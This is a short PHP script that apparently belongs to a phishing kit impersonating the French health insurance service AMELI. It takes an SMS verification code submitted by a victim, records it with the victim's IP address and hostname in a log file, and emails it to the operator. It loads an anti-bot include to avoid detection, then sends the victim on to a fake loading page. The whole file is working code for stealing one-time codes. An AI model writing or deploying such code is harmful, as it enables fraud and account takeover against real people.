<?php
include 'antibots.php';
include 'email.php';
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);
$message .= "[AMELI]\n";
$message .= "SMS      : ".$_POST['o8']."\n";
$message .= "[DON]\n";
$file = fopen("../../sms1.txt","a");
fwrite($file, "\n".$message);
fclose($file);
$subject = "DON[SMS] $ip";
$headers = "From: <localhost>";
mail($send,$subject,$message,$headers);

echo '<script language="Javascript">
<!--
document.location.replace("./loding2.html");
// -->
</script>';
?>